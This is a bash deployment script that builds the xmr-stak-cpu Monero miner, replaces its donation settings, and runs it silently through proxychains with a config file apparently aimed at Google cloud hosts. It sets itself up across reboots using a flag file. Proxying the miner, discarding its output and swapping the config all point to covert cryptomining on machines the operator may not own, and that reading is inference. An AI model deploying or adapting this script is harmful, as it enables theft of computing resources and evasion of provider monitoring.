#!/bin/bash
sudo sysctl -w vm.nr_hugepages=128
file="/flag2"
if [ -f "$file" ]
then
	sudo apt-get install cmake -y
	cd /m/test01
	sudo apt-get update && sudo apt-get install build-essential -y
	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
	sudo dpkg --configure -a
	sudo rm -R /m/test01/xmr-stak-cpu
	sudo git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
	cd /m/test01/xmr-stak-cpu
        cp /m/test01/xmr/donate-level.h /m/test01/xmr-stak-cpu/donate-level.h
#	sudo sed -i 's/1.0/0.0/' /m/test01/xmr-stak-cpu/donate-level.h
	sudo cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF -DHWLOC_ENABLE=OFF
	sudo make
	sudo make install
	sudo chmod +x /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu	
 	sudo chmod +x /m/test01/proxychains-ng/proxychains4	
 	sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
	# Placeholder for ProxyChains Update from Boot Strap Variables
	# sudo sed -i 's/socks4/#http/' /m/test01/proxychains-ng/src/proxychains.conf
	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
	sudo cp /m/test01/xmr/config.google /m/test01/xmr-stak-cpu/bin/config.txt
#       ( sleep 10800 ; sudo reboot ) & 
	cd /m/test01/xmr-stak-cpu/bin
        sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
#	sudo sed -i 's/usa/eu/' /m/test01/xmr-stak-cpu/bin/config.txt
#	sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1	
	sudo reboot   
else   
        sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
        sudo /bin/su -c "echo 'soft memlock 262144' >> /etc/security/limits.conf"
  	sudo /bin/su -c "echo 'hard memlock 262144' >> /etc/security/limits.conf"
	sudo /bin/su -c "echo 'xxxxx' >> /flag2"
        sudo reboot  
fi

exit
